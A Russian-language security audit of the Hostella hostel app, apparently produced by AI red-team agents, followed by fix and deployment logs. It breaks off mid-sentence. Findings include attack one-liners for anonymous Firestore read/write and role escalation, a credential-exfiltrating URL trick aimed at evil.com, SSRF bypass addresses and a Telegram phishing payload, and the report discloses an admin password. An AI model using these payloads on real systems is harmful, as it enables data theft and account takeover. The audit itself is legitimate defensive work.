# Отчёт по безопасности Hostella — 2026-08-20

Аудит проведён 6 параллельными red-team агентами по зонам: Electron, правила Firebase,
Cloud Functions/крипто, XSS/инъекции вывода, финансовая логика, зависимости/конфигурация.
Ветка: `security/audit-fixes`. Ничего не исправлялось — только поиск.

**Итог по количеству:** Critical — 10, High — 14, Medium — 20, Low — 13, плюс Info/позитив.

---

## 🔴 КОРНЕВАЯ ПРИЧИНА (из неё вытекает большинство Critical/High)

**Вход в приложение — это `signInAnonymously`, а все проверки логина, ролей и филиалов
выполняются в JavaScript на клиенте.** Правила Firestore дают `read, write` любому
обладателю анонимной сессии почти на все коллекции (исключены только `userSecrets` и
`authThrottle`). Публичный web-ключ Firebase лежит в бандле, поэтому **аноним** может
из консоли браузера напрямую читать и писать данные, минуя весь интерфейс.
Пока это не исправлено, **ни одна клиентская проверка не является реальной защитой.**

Правильная починка: перейти на настоящий Firebase Auth (email/пароль или custom claims),
переписать `firestore.rules`/`storage.rules` с проверкой личности, роли, `hostelId` и
формы данных на сервере; денежные мутации и запись аудита увести в Cloud Functions.

---

## CRITICAL

### C1. Анонимная сессия = полный read/write ко всем бизнес-данным
- **Категория:** Broken Access Control
- **Где:** `firestore.rules:40-49`; `src/App.jsx:522`; `src/firebase.js:13-23`
- **Атака:** `initializeApp(cfg); await signInAnonymously(auth); getDocs(collection(db,'artifacts/hostella-multi-v4/public/data/guests'))` — выгрузка/перезапись любых `guests`, `clients`, `payments`, `expenses`, `shifts`, `users`, `sessions`, `auditLog`, `settings`.
- **Последствие:** полная потеря конфиденциальности и целостности всех данных неаутентифицированным атакующим.

### C2. Эскалация прав: любой пользователь переписывает свою роль на `super`/`admin`
- **Категория:** Privilege Escalation
- **Где:** `firestore.rules:40-43`; `src/constants/config.js:18-22`
- **Атака:** `updateDoc(doc(db,'.../users/<id>'), { role:'super', hostelId:'all', permissions:{} })`; можно создать нового пользователя, удалить сотрудников, выставить `forceLogoutAfter` и заблокировать всех.
- **Последствие:** полный захват прав владельца + DoS для персонала.

### C3. Захват супер-админа через перезапись `superPassHash`
- **Категория:** Broken Auth / Privilege Escalation
- **Где:** `functions/index.js:633-656` (`authenticateSuper`) + `firestore.rules:40-44`
- **Атака:** `setDoc('.../settings/appConfig', { superPassHash: sha256('pwn') })`, затем `authenticateUser({login:'Super', password:'pwn'})` → функция принимает хеш и выдаёт `role:'super'`.
- **Последствие:** захват супер-админа из неаутентифицированной позиции.

### C4. Legacy `users.pass` (несолёный SHA-256/plaintext) читается всеми и всё ещё пишется на клиенте
- **Категория:** Weak Crypto / Credential Exposure
- **Где:** `firestore.rules:40-41`; `src/hooks/useShiftActions.js:411,419,471`; `functions/index.js:563-566,766-770`
- **Атака:** `getDocs(collection(db,'.../users'))` → сбор всех `pass`, оффлайн-подбор по словарю (дефолты `123`/`admin`, минимум пароля — 4 символа).
- **Последствие:** восстановление паролей всех сотрудников; сводит на нет миграцию на `userSecrets`.

### C5. Токены Telegram-ботов и `superPassHash` в читаемом `settings`
- **Категория:** Secret Leak
- **Где:** `functions/index.js:289-296` (`kppBotToken`), `1068-1079` (`priceBotToken`); `src/utils/appConfig.js:25`
- **Атака:** `getDoc('.../settings/telegram')` и `'.../settings/appConfig'` → извлечь токены, обращаться к `api.telegram.org/bot<TOKEN>/…` напрямую.
- **Последствие:** полный контроль над ботами (KPP и одобрение цен), спуфинг одобрений.

### C6. PII гостей/клиентов (паспорта, ПИНФЛ, даты рождения, телефоны) читаются анонимно
- **Категория:** PII Exposure
- **Где:** `firestore.rules:40-41`; `src/hooks/useClientActions.js:130-151`; `src/hooks/useAppData.js:95-106`
- **Атака:** `getDocs(collection(db,'.../clients'))` / `.../guests` — массовый экспорт паспортных данных.
- **Последствие:** утечка удостоверяющих документов гостей (регуляторный риск).

### C7. Финансовые записи можно подделать/изменить/удалить напрямую через SDK
- **Категория:** Broken Access Control / Financial Integrity
- **Где:** `firestore.rules:40-41`; `settings/shiftLocks`, `payments`, `shifts`, `expenses`, `manualStayGroups`
- **Атака:** `addDoc/updateDoc/deleteDoc` платежа или закрытия смены; обнулить долг в `manualStayGroups`; перезаписать `settings/shiftLocks` и переоткрыть закрытую смену.
- **Последствие:** фабрикация/стирание выручки, долгов, цифр закрытия смены.

### C8. Аудит-лог пишется/удаляется клиентом и глобально отключается из настроек
- **Категория:** Missing/Suppressible Audit (anti-forensics)
- **Где:** `src/utils/auditLog.js:15-31` (`if auditEnabled === false) return`); `firestore.rules:40`
- **Атака:** кассир ставит `settings.auditEnabled=false`, совершает махинацию, возвращает обратно; или напрямую `deleteDoc`/правит свои записи `auditLog`.
- **Последствие:** главный механизм выявления мошенничества можно подавить, переписать или удалить.

### C9. Electron: путь окна e-mehmon строится конкатенацией строки от рендерера → загрузка чужого домена с автозаполнением логина/пароля
- **Категория:** Electron Navigation Hijack / Credential Exfiltration
- **Где:** `electron/main.js:272`; зеркальный редирект `electron/emehmonAutofill.js:44`
- **Атака:** `openEmehmon({ path:'@evil.com/', login, password })` → URL `https://emehmon.uz@evil.com/` → Chromium трактует `emehmon.uz` как userinfo и грузит `evil.com`; затем инжектится скрипт автозаполнения с реальными логином/паролем и `window.__hostellaGuest = GUEST`.
- **Последствие:** захват аккаунта e-mehmon + вывод всех PII гостей одним IPC-вызовом.

### C10. Electron: автозаполнение с учётными данными инжектится на КАЖДОЙ навигации без allowlist origin
- **Категория:** Script Injection / Credential Exfiltration
- **Где:** `electron/main.js:279-281,252`; `electron/emehmonAutofill.js:258,104-107`
- **Атака:** `did-finish-load`/`did-navigate`/`did-navigate-in-page` зовут `inject()` без проверки, что origin всё ещё `emehmon.uz`. Компрометация/open-redirect/MITM портала → учётные данные уходят на чужой origin. У окон e-mehmon нет `will-navigate`-защиты (в отличие от главного окна на `main.js:181`).
- **Последствие:** кража учётных данных и PII на любой origin, куда уведёт портал.

---

## HIGH

### H1. Неподписанное авто-обновление Electron из публичного GitHub-фида → канал распространения RCE
- **Где:** `package.json` (`build.win`/`build.publish`, нет `certificateFile`/`cscLink`); `electron/main.js:119-139,211-215,732-737`
- **Атака:** компрометация GitHub-аккаунта/`GH_TOKEN` или MITM → публикация вредоносного релиза; клиенты сами устанавливают его при простое (`quitAndInstall(true,true)`, авто-установка через 3 мин простоя) без проверки подписи.
- **Починка:** подписать installer (EV/OV или Azure Trusted Signing), чтобы `electron-updater` проверял издателя; 2FA и scoped-token на релизы.

### H2. Electron 28 (EOL) с 30+ известными CVE — это реальный runtime приложения
- **Где:** `electron@28.3.3`
- **Атака:** любой инжект в рендерер (см. H3) или вредоносная страница портала в дочернем окне может использовать обход context-isolation/ASAR → выход в main-процесс.
- **Починка:** обновить Electron до поддерживаемой мажорной версии.

### H3. Нет Content-Security-Policy на рендерере → XSS→IPC / цепочка выхода из песочницы
- **Где:** `index.html`, `booking.html`, `public/occupancy-widget.html`, `electron/main.js` (нет `onHeadersReceived`), `firebase.json`
- **Атака:** любой stored/reflected инжект выполняет inline-скрипт; вместе с H2 → выполнение кода в рендерере с доступом к `electronAPI` (`fetchIcal` SSRF, `openEmehmon` кража учёток).
- **Починка:** строгий CSP через `session.onHeadersReceived` (desktop) и `hosting.headers` (web).

### H4. SSRF в `fetch-ical` обходится (integer/IPv6-кодировки, DNS-rebinding)
- **Где:** `electron/main.js:638-685`
- **Атака:** `https://2130706433/` (=127.0.0.1) или `https://0x7f000001/` минуют regex; IPv6 ULA/link-local/IPv4-mapped `[::ffff:169.254.169.254]` не блокируются; `attacker.com`, резолвящийся в `169.254.169.254` — проверяется строка, а не адрес, к которому реально идёт `https.get`.
- **Починка:** резолвить хост самому, отклонять приватные/loopback/link-local/ULA адреса и пинить соединение к проверенному IP.

### H5. Изоляция филиалов только на клиенте → межфилиальный доступ
- **Где:** `firestore.rules:40-49`; `src/hooks/useAppData.js:67-115` (подписки без `where('hostelId',…)`)
- **Атака:** кассир филиала A читает/пишет данные филиала B (`guests`, `payments`, `cadastres` и т.д.).
- **Починка:** в правилах требовать `resource.data.hostelId == <hostelId вызывающего>`.

### H6. Удаление платежа/расхода не пишет запись в аудит
- **Где:** `src/hooks/useExpenseActions.js:166-230` (`handleDeletePayment`)
- **Атака:** кассир удаляет наличный приход после снятия отчёта смены — нигде не фиксируется, кто что удалил.
- **Починка:** логировать каждое удаление (`payment_delete`/`expense_delete`) с полной прежней записью до удаления.

### H7. Долг обнуляется «доп-начислением» с отрицательной суммой — без прав админа и без аудита
- **Где:** `src/components/Views/ManualStayView.jsx:186-192` (`addExtraCharge`); `src/utils/contractFinancials.js:69-90`
- **Атака:** `addExtraCharge({name:'x', amount:-500000})` снижает «Начислено» → долг исчезает мимо админского write-off и без `logAction`.
- **Починка:** отклонять `amt < 0`, снижения — только через аудируемый admin-gated `addWriteOff`, и то и другое проверять на сервере.

### H8. Оплата долга/гостя без защиты от двойного клика/идемпотентности → двойные деньги
- **Где:** `src/components/Views/DebtsView.jsx:181-194,150-154`; `src/hooks/useGuestActions.js:514-586,1070-1105`
- **Атака:** двойной тап по «Сохранить» на медленном устройстве → два `increment(pay)` и два `payments`-документа → гость переплачен, наличные задвоены в отчётах. (У `RentalPayModal` есть `busy`-защита, у оплаты из «Долгов» — нет.)
- **Починка:** `busy`-latch + клиентский idempotency-id с дедупом в транзакции.

### H9. `handleAdminReduceDays` фабрикует возврат наличных и уводит балансы в минус
- **Где:** `src/hooks/useGuestActions.js:1044-1057`
- **Атака:** сократить дни гостю, оплатившему картой/QR или меньше `refundAmount`: `paidCash`/`amountPaid` уходят в минус — прикрытие реального снятия наличных, без аудита.
- **Починка:** ограничивать возврат фактически оплаченным, декрементить нужный метод, не ниже нуля, логировать.

### H10. Одобрение снижения цены полностью подделываемо
- **Где:** `functions/index.js:1120-1210` (`telegramWebhook`, esp. 1129-1139,1132)
- **Атака:** (a) если `TELEGRAM_WEBHOOK_SECRET` не задан — функция логирует «UNPROTECTED» и продолжает; POST поддельного `callback_query` `data:"pricereq:approve:<id>"`; сравнение секрета не constant-time (`!==`). (b) в любом случае аноним может `updateDoc(priceRequests/<id>,{status:'approved'})` и `setDoc(guests/<id>,{priceReductionAllowed:true, approvedPrice:1})`.
- **Починка:** требовать секрет (fail-closed), сравнивать `crypto.timingSafeEqual`, состояние одобрения писать только из функций.

### H11. `sendTelegramMessage` — открытый релей от главного бота в любые чаты
- **Где:** `functions/index.js:213-250`
- **Атака:** анонимная сессия → `sendTelegramMessage({text, chatIds:['<любой>']})` с `parse_mode:'HTML'`, минуя фильтрацию получателей.
- **Починка:** требовать реального аутентифицированного сотрудника; запретить произвольные `chatIds` от клиента.

### H12. Получателей Telegram-уведомлений может дописать любой → эксфильтрация PII гостей
- **Где:** `firestore.rules:40-44` + `functions/index.js:278-337,505-538`
- **Атака:** аноним добавляет `{active:true, telegramId:'<чат атакующего>', notifications:{…}}` в `settings/telegram.recipients` → все будущие уведомления с PII идут атакующему.
- **Починка:** `settings/*` — только запись из функций, проверять получателей на сервере.

### H13. Спуфинг `X-Forwarded-For` обходит все rate-limit'ы
- **Где:** `functions/index.js:433,577-582,223-224,710-735`
- **Атака:** IP берётся из `xff.split(',')[0]` (левый, контролируемый клиентом); свежий случайный `X-Forwarded-For` на каждый запрос делает ключи уникальными → лимиты (логин, 10 броней/10 мин, 120 Telegram/10 мин) не срабатывают → флуд `createWebBooking` (каждая шлёт алерт кассиру), ослабление brute-force защиты.
- **Починка:** использовать платформенный IP (`req.ip`/правый доверенный hop), не доверять клиентскому XFF.

### H14. Telegram HTML-инъекция через публичную бронь (имя/телефон, без авторизации)
- **Где:** `src/App.jsx:1229-1232`; источник — `src/booking/BookingWidget.jsx:215-237`; тот же паттерн в жизненных сообщениях `src/hooks/useGuestActions.js:342,446,471,568,633,706,978`, `useExpenseActions.js:83,147`
- **Атака:** через публичный сайт отправить бронь с `fullName = <a href="https://evil/pay">Оплатите тут</a>` → в доверенном канале персонала рендерится фишинг-ссылка; тег, который Telegram не принимает (`<script>`) → HTTP 400 → уведомление не доставляется (DoS).
- **Починка:** экранировать все пользовательские значения перед `parse_mode:HTML` (использовать существующий `escapeHtml` из `utils/auditLog.js`) или слать машинные уведомления plain-text.

---

## MEDIUM

### M1. `fetch-ical` без лимита размера/времени ответа → OOM DoS main-процесса
- **Где:** `electron/main.js:678-680` — накопление `data += chunk` без ограничений. Починка: байтовый лимит (~5 МБ), таймаут, проверка `Content-Type`.

### M2. Дочерние окна выселения разрешают порталу открывать любые новые окна с ослабленными webPreferences
- **Где:** `electron/main.js:345-352` (`setWindowOpenHandler → allow`); нет `will-navigate` на окнах e-mehmon. Починка: allowlist `emehmon.uz`, явно `contextIsolation:true, nodeIntegration:false, sandbox:true`.

### M3. Целевая блокировка аккаунта и глобальная блокировка admin-stats (DoS)
- **Где:** `functions/index.js:746` (`login_<login>`), `855` (`'adminStats'` — константный ключ). 20 неудач блокируют на час. Починка: ключ (IP+login); admin-stats — по личности вызывающего.

### M4. Учётные данные госпортала e-mehmon в Firestore лишь в base64
- **Где:** `src/utils/emehmon.js:9-11,22` + `firestore.rules:40-44`. Аноним читает `settings/emehmon`, `atob(pw)` → plaintext. Починка: хранить в Secret Manager, действия проксировать через функцию.

### M5. `getFreeBeds` — API-ключ в query-строке и не-constant-time сравнение
- **Где:** `functions/index.js:901-910`. Ключ утекает в логи/referer; `!==`. Починка: только заголовок, `timingSafeEqual`, ротация.

### M6. `scanPassport` возвращает внутренние ошибки и принимает безлимитные изображения
- **Где:** `functions/index.js:35-78`. Починка: лимит base64, generic-ошибка клиенту, детали — только в лог.

### M7. Слабая парольная политика (минимум 4 символа) на сервере
- **Где:** `functions/index.js:799`; `ChangePasswordModal.jsx:25`. Починка: усилить минимум + сложность на сервере.

### M8. Нет валидации формы данных в правилах → инъекция полей в Excel/Telegram
- **Где:** `firestore.rules:40-49`. Атакующий пишет произвольные/огромные поля, попадающие в отчёты. Починка: проверять типы/длины/наличие полей в правилах.

### M9. Storage: чеки/логотипы читаются любым анонимом, открытая загрузка
- **Где:** `storage.rules:22-31`. Аноним читает все фото-чеки всех филиалов; загружает 10 МБ-картинки многократно; перезаписывает брендинг. Починка: scope по филиалу и роли, размер/лимиты.

### M10. Загрузка логотипа идёт в `logos/`, который не покрыт правилом → сломано (default-deny)
- **Где:** `src/components/Views/HostelSettingsView.jsx:386-388` vs `storage.rules:22-34` (`hostels/`). Признак рассинхрона правил и кода. Починка: выровнять путь или добавить `match /logos/`.

### M11. `extraCharges`/`writeOff` контракта — read-modify-write массива на клиенте → потерянные обновления
- **Где:** `src/components/Views/ManualStayView.jsx:191,243,257,283-284`. Две сессии перезаписывают массив (одно начисление теряется); `transferBalance` пишет два документа не атомарно. Починка: `runTransaction`/`arrayUnion`, обе ноги перевода — в одной транзакции.

### M12. Передача смены без защиты от двойного клика → дубль смены + двойная зарплата
- **Где:** `src/hooks/useShiftActions.js:227-309`; `ShiftClosingModal.jsx:203-210`. Двойной клик → две новые открытые смены партнёру по 0.5 суток. Починка: latch + транзакция с re-read `endTime==null`.

### M13. При закрытии смены нет поля «фактически посчитанные деньги» → недостачу нельзя обнаружить
- **Где:** `src/utils/shiftReport.js:76-83`; `ShiftClosingModal.jsx` (нет поля ввода факта). Кассир недозаписывает наличный платёж — ожидаемое совпадает с ящиком, смена закрывается «чисто». Починка: обязательный ввод факта, хранить ожидание/факт/дельту, алерт на недостачу.

### M14. Задним числом можно вынести деньги за пределы закрытого окна сверки
- **Где:** `src/components/Modals/ExpenseModal.jsx:161,238,255` (`canBackdate` для admin и логина `fazliddin`). Расход датируется в уже закрытую смену. Починка: ограничить окно, логировать исходную/выбранную дату.

### M15. `handleBulkExtend` обнуляет `totalPrice`, когда `pricePerNight = 0`
- **Где:** `src/hooks/useGuestActions.js:666-689`. Пакетное продление гостю с нулевой ставкой стирает долг в 0. Починка: fallback `totalPrice/days`, не перезаписывать в 0.

### M16. `handleUndo` не атомарен и не идемпотентен
- **Где:** `src/hooks/useGuestActions.js:104-212`. Двойной «Отменить» → двойной декремент балансов. Починка: помечать запись «reversed» в транзакции, no-op на второй раз.

### M17. Telegram HTML-инъекция через отчёт смены (имя кассира/получатель перевода)
- **Где:** `src/utils/shiftReport.js:95` (`user.name`, `p.transferTo`). Починка: экранировать перед интерполяцией.

### M18. Живые секреты в plaintext в `functions/.env`/`.env.local` (в git НЕ попали)
- **Где:** `functions/.env:1-3` (`TELEGRAM_BOT_TOKEN`, `TELEGRAM_WEBHOOK_SECRET`, `ADMIN_STATS_PASSWORD`). Починка: перенести в Secret Manager, ротировать токен/секрет (жили в plaintext).

### M19. Слабый пароль admin-stats `hostella2026`
- **Где:** `functions/.env:3` → `functions/index.js:843`. Починка: длинный случайный секрет, ротация. (Само сравнение — `safeEqual`+`timingSafeEqual`, ок.)

### M20. Firebase Hosting не отдаёт заголовки безопасности
- **Где:** `firebase.json` (`headers` только `Cache-Control`). Нет CSP/`X-Frame-Options`/HSTS/`X-Content-Type-Options`/`Referrer-Policy`. Починка: добавить в `hosting.headers` `source:"/**"`.

---

## LOW

- **L1.** `save-pending-payments` пишет на диск и `JSON.parse`ит данные рендерера без схемы — `electron/main.js:587-612`. Ограниченное влияние (фикс. имена файлов). Валидировать форму/размер.
- **L2.** IPC управления окном без null/destroyed-guard — `electron/main.js:582-584,615-633`; краш main при гонке закрытия. `if (mainWindow && !mainWindow.isDestroyed())`.
- **L3.** Поверхность Excel-formula injection (типизированные ячейки, низко) — `src/components/Views/Reports/debtExcel.js:93`; `ReportsView.jsx:57`. Префикс-guard для `= + - @`.
- **L4.** В окне печати не экранированы `hostel.name`/`hostel.address`/`guest.days` — `src/utils/helpers.jsx:278-279,287`; `GuestDetailsModal.jsx:54-55`. Прогнать через `escHtml`.
- **L5.** `handleSuperPayment` завышает `paidCash` без наличной записи — `src/hooks/useGuestActions.js:645-664`. Отдельное поле, исключённое из refund-математики.
- **L6.** Принимаются отрицательные суммы — `src/components/Modals/CreateDebtModal.jsx:20-24`; смешанные методы (`cash:1000, card:-500`). Отклонять негативы, каждый метод ≥ 0.
- **L7.** `siteCallbackKey` захардкожен как fallback в бандле — `src/utils/siteCallback.js:24`. Возможна подделка callback'ов брони на `hostella.uz`. Убрать хардкод, увести через функцию.
- **L8.** `session.js` шлёт IP/гео на сторонний `ipwho.is` и пишет в читаемый `sessions` — `src/utils/session.js:32-48`. Определять IP на сервере, закрыть чтение `sessions`.
- **L9.** `electron-updater` advisory (утечка токена на cross-origin redirect) — частично неприменимо (публичный фид). Обновить вместе с Electron.
- **L10.** `getAvailability` — публичный `CORS *` без rate-limit — `functions/index.js:341-350`. Добавить `rateLimit()`.
- **L11.** CI использует `npm install` вместо `npm ci` — `.github/workflows/deploy.yml`, `release.yml`. Пинить SHA у сторонних action'ов.
- **L12.** Sentry без scrubbing PII (`beforeSend`) — `src/main.jsx:25-40`. Добавить scrubber до включения в проде.
- **L13.** `exceljs@4.4.0` → уязвимый `uuid` (moderate, OOB-write), достижим через Excel-экспорт. Обновить.
- **L14.** Полный скан коллекции `users` на каждый логин/смену пароля — `functions/index.js:757-758,809-810`. Запрос по индексированному `login`.

---

## Зависимости — сводка npm audit

- **Root `--production`:** Critical 0, High 0, Moderate 2 (`exceljs`→`uuid`).
- **Root (полный, вкл. dev/build):** Critical 1 (`tar`, build-time), High 15 (`electron` runtime + сборочные), Moderate 3.
- **`functions/`:** Critical 1 (`websocket-driver`), High 4 (`@grpc/grpc-js` достижим через firebase-admin, `form-data`, `js-yaml`, `brace-expansion`), Moderate 11, Low 2 → `npm audit fix`, поднять `firebase-admin`/`firebase-functions`/`@grpc/grpc-js`, передеплой.

---

## ℹ️ Что сделано ПРАВИЛЬНО (не трогать)

- Секретов в git-истории **нет** (`git log --all` по `.env*` пуст; трекается только `functions/.env.local.example` с плейсхолдером).
- Современный путь паролей: PBKDF2-SHA256 / 210k итераций / 16-байтная соль / constant-time `safeEqualHex` (`functions/lib/password.js`).
- Дефолтный супер-хеш (`sha256('super')`) явно отклоняется (`functions/index.js:618,640`).
- `verifyAdminPassword` — constant-time `safeEqual`; `authPolicy.js` — эскалирующая блокировка с серверными счётчиками.
- Коллекции `userSecrets` и `authThrottle` корректно закрыты; финальный `match /{document=**} { allow read, write: if false; }` — верный образец.
- Главное окно Electron хорошо укреплено: `contextIsolation:true`, `nodeIntegration:false`, `webSecurity:true`, `enableRemoteModule:false`, блокировка внешней навигации.
- Telegram HTML в booking/price/error-сообщениях экранируется `escTgHtml`; окна печати чеков экранируют поля гостей; iCal только парсится (генерации нет — CRLF-инъекция невозможна); `TemplateEditorModal.applyGuestVars` и `safeLogoUrl` — безопасны.
- Firebase web API-ключ в бандле — публичный по дизайну, утечкой не является.

---

## Порядок исправления (приоритет)

1. **Настоящий Firebase Auth + серверные правила** (снимает C1–C8, H5, H10–H12, M8, и делает клиентские проверки реальными).
2. **Убрать секреты из клиент-читаемого Firestore** (C4, C5, M4, M18) — токены/хеши/госдоступы в Secret Manager; ротация; удалить `users.pass`.
3. **Аудит-лог append-only только из функций + логировать все денежные мутации/удаления** (C8, H6, M-серия аудита).
4. **Electron: валидировать путь/origin окон e-mehmon, добавить `will-navigate`, не класть учётки на `window.*`** (C9, C10, M2); подписать авто-обновление (H1); обновить Electron (H2); добавить CSP (H3); чинить SSRF `fetch-ical` (H4).
5. **Финансы: запретить отрицательные начисления, latch+идемпотентность оплат/переводов, фактический подсчёт наличных при закрытии смены** (H7, H8, H9, M11–M16).
6. **Функции: требовать webhook-секрет (const-time), брать доверенный IP, усилить парольную политику, обновить зависимости** (H10, H13, M3, M5, M6, M7, functions-deps).

---

# Статус исправлений (ветка security/audit-fixes)

Прогон: `npm test` — 74/74 ✓ · `npm run build` ✓ · `eslint` — 0 ошибок · `node --check` electron/functions ✓.

## ✅ Исправлено в коде

| ID | Что сделано | Файлы |
|----|-------------|-------|
| C9 | URL окна e-mehmon строится безопасно (`buildEmehmonUrl`, фикс. origin + валидация пути); санитизация пути и во внедряемом скрипте | `electron/main.js`, `electron/emehmonAutofill.js` |
| C10 | Автозаполнение с учётными данными инжектится только когда окно на emehmon.uz (`safeInjectAutofill`); `will-navigate`/`setWindowOpenHandler` заперты на emehmon.uz (`hardenEmehmonWindow`) | `electron/main.js` |
| H4 | SSRF `fetch-ical`: DNS-резолв + блок приватных/loopback/link-local/ULA/IPv4-mapped + пин к проверенному IP (закрыт rebinding); блок integer/hex-хостов | `electron/main.js` |
| M1 | `fetch-ical`: лимит 5 МБ + таймаут 15с | `electron/main.js` |
| M2 | Дочерние окна портала — allowlist + полный hardening webPreferences | `electron/main.js` |
| L1 | `save-pending-payments`: только массив, лимит размера; `load` — только массив | `electron/main.js` |
| L2 | Null-guard'ы во всех window-IPC (`liveWin()`) | `electron/main.js` |
| H14 | Экранирование пользовательских полей во ВСЕХ Telegram parse_mode:HTML (`escapeTg`): имя, паспорт, страна, комментарий, кассир — включая публичную бронь | `telegram.js`, `useGuestActions.js`, `useExpenseActions.js`, `useRegistrationActions.js`, `useCadastreActions.js`, `App.jsx` |
| M17 | Экранирование имени кассира и получателя перевода в отчёте смены | `src/utils/shiftReport.js` |
| H7 | Запрет отрицательных/нулевых доп-начислений (снижения — только через admin-списание) | `ManualStayView.jsx` |
| H8 | Синхронный ref-latch против двойного клика при оплате долга/аренды | `DebtsView.jsx` |
| H9 | Возврат при сокращении дней ограничен реально оплаченным (нет ухода в минус) + аудит | `useGuestActions.js` |
| M15 | Продление не обнуляет `totalPrice` у гостей с нулевой ставкой | `useGuestActions.js` |
| L6 | Запрет отрицательной суммы долга | `CreateDebtModal.jsx` |
| H10 | Webhook Telegram: fail-closed без секрета + константное сравнение (`safeEqual`) | `functions/index.js` |
| H13 | IP берётся из доверенного хвоста XFF, а не спуфимого левого (rate-limit'ы не обходятся) | `functions/index.js` |
| M5 | `getFreeBeds`: ключ только из заголовка `x-api-key` + `safeEqual` | `functions/index.js` |
| M6 | `scanPassport`: лимит размера изображения + generic-ошибка клиенту | `functions/index.js` |
| M7 | Минимальная длина пароля 4 → 6 (на сервере) | `functions/index.js` |
| C8* | Аудит-лог append-only, сессии неудаляемы (частично: анти-forensics) | `firestore.rules` |
| M20* | Безопасные HTTP-заголовки хостинга (nosniff, Referrer-Policy, HSTS) | `firebase.json` |
| L11 | CI: `npm install` → `npm ci` | `.github/workflows/*` |

\* частичное исправление в рамках текущей модели; полное закрытие — после миграции на Firebase Auth.

## ⚠️ Требует твоего действия (нельзя закрыть только кодом)

1. **Деплой правок функций и правил:** `firebase deploy --only functions,firestore:rules`. До деплоя правки `functions/` и `firestore.rules` не действуют.
2. **n8n:** переключить `getFreeBeds` с `?key=…` на заголовок `x-api-key: …` (ключ в query больше не принимается).
3. **Webhook Telegram:** задать `TELEGRAM_WEBHOOK_SECRET` и пересоздать вебхук с тем же `secret_token` — иначе webhook теперь отвечает 503 (fail-closed).
4. **Ротация секретов (M18/M19):** сменить `TELEGRAM_BOT_TOKEN`, `TELEGRAM_WEBHOOK_SECRET` и `ADMIN_STATS_PASSWORD` (жили в plaintext; `hostella2026` — угадываемый). Секреты — в Firebase Secret Manager, не в `.env`.
5. **H1 — подпись авто-обновления:** добавить Windows code-signing (EV/OV или Azure Trusted Signing) в `build.win` (`certificateFile`/`cscLink`), 2FA на релизный аккаунт. Без сертификата `electron-updater` не проверяет издателя.
6. **H2 / зависимости:** обновить Electron до поддерживаемой мажорной версии; в `functions/` — `npm audit fix` и подъём `firebase-admin`/`@grpc/grpc-js` (с тестом и передеплоем — потому не делаю вслепую).
7. **H3 — CSP на рендерере:** вставить и протестировать на упакованной сборке (см. ниже). Не ставлю вслепую — неверный CSP «забелит» приложение.

### Заготовка CSP для Electron (протестировать на реальной сборке перед релизом)
В `createWindow()`, после создания `mainWindow`:
```js
mainWindow.webContents.session.webRequest.onHeadersReceived((details, cb) => {
  cb({ responseHeaders: { ...details.responseHeaders,
    'Content-Security-Policy': [
      "default-src 'self'; " +
      "script-src 'self' 'unsafe-inline' 'unsafe-eval'; " +   // ExpenseModal использует Function()
      "style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data:; " +
      "connect-src 'self' https://*.googleapis.com https://*.firebaseio.com wss://*.firebaseio.com " +
      "https://*.cloudfunctions.net https://*.firebaseapp.com https://ipwho.is https://*.sentry.io; " +
      "object-src 'none'; base-uri 'self'; frame-src 'self'"
    ] } });
});
```

## 🔴 Отдельный крупный трек — миграция на Firebase Auth (не начата)

Корневые Critical C1–C7, H5, H11, H12 (аноним = полный доступ, эскалация ролей, секреты и PII в читаемом Firestore, межфилиальный доступ) закрываются только заменой `signInAnonymously` на настоящий Firebase Auth (custom claims: роль, `hostelId`) и переписыванием правил под проверку личности/роли/тенанта/формы данных на сервере, плюс переносом секретов из клиент-читаемого `settings` на сервер. Это отдельная согласованная работа с тестами и осторожным деплоем (иначе мгновенная блокировка кассиров). Готов взяться отдельно.

---

# Развёрнуто (2026-08-20)

- **Firestore rules** — задеплоены (`firebase deploy --only firestore:rules`). Аудит-лог append-only, сессии неудаляемы — активны в проде.
- **Cloud Functions** — все 11 функций обновлены. Проверено в проде: `getFreeBeds` без заголовка → 401, старый `?key=` → 401 (query больше не принимается), `telegramWebhook` без секрета → 401 (fail-closed), `getAvailability` → 200. Ничего не сломано.
- **Секреты перенесены в Google Secret Manager** — `TELEGRAM_BOT_TOKEN`, `TELEGRAM_WEBHOOK_SECRET`, `ADMIN_STATS_PASSWORD` (значения сверены с прежними по хешу, совпали). В коде добавлены привязки `.runWith({ secrets: [...] })`, из `functions/.env` секреты удалены. Доступ выдан сервис-аккаунту при деплое.
- **Hosting** — пересобран и задеплоен. Security-заголовки (nosniff, Referrer-Policy, HSTS) отдаются на `https://hostella-app-a1e07.web.app`.

**Electron-правки (C9, C10, H4, M1, M2, L1, L2)** — в коде, деплоя не требуют: попадут в пользователей со следующей desktop-сборкой (`npm run dist`).

## Осталось за тобой (я не делаю автономно — риск)
- **n8n:** переключить `getFreeBeds` с `?key=` на заголовок `x-api-key` (иначе интеграция получает 401).
- **Ротация секретов:** токены/пароль жили в plaintext — желательно сменить `TELEGRAM_BOT_TOKEN` (через @BotFather), `TELEGRAM_WEBHOOK_SECRET` и `ADMIN_STATS_PASSWORD`. Не делаю сам: смена бот-токена рвёт webhook до повторного `setWebhook`, а новый пароль нужно знать тебе. После смены: `firebase functions:secrets:set <NAME>` + редеплой функций.
- **H1** code-signing, **H2** апгрейд Electron/зависимостей, **H3** CSP (тест на сборке), и **крупный трек — миграция на Firebase Auth** (корневые C1–C7).

---

# C5 — токены ботов перенесены из Firestore в Secret Manager (2026-08-20)

Обнаружено при миграции: `settings/appConfig.priceBotToken` = **тот же самый** основной
`TELEGRAM_BOT_TOKEN` (sha256 совпал), а `settings/telegram.kppBotToken` — отдельный бот.
Оба читались любым анонимом (корень C1). Значения перенесены **без изменения** (по просьбе — не ротировать):

- `KPP_BOT_TOKEN` → Secret Manager, привязан к `sendTelegramMessage`; код читает `process.env.KPP_BOT_TOKEN`, не Firestore.
- `getPriceBotToken()` берёт `PRICE_BOT_TOKEN` (env, fallback `TELEGRAM_BOT_TOKEN`), больше не читает Firestore.
- Поля `priceBotToken` и `kppBotToken` **удалены** из Firestore `settings` (проверено). Список получателей КПП сохранён.
- UI (`PricingSettingsPanel`, `TelegramSettingsView`): ввод токена убран, показывается «токен на сервере».

Задеплоено: функции + хостинг. Секреты в Secret Manager: `TELEGRAM_BOT_TOKEN`, `TELEGRAM_WEBHOOK_SECRET`,
`ADMIN_STATS_PASSWORD`, `KPP_BOT_TOKEN`, `N8N_API_KEY`.

**Осталось в читаемом Firestore (C5, не токен):** `settings/appConfig.superPassHash` (хеш супер-пароля) —
